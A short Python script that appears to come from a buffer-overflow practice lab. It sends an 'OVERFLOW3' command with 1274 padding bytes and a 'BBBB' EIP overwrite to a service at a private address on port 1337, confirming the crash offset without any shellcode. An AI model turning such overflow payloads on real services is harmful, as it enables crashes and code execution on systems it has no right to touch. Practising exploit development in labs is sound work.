import socket, struct


host, port = '10.10.100.108', 1337

command = b'OVERFLOW3 '

new_eip = b'BBBB'
offset = 1274
length = 1300
payload = b''.join([

command,
b'A' * offset,
new_eip,
b'C' * (length - offset - len(new_eip)),



])




with socket.socket() as s:
        s.connect((host,port))
        s.send(payload)
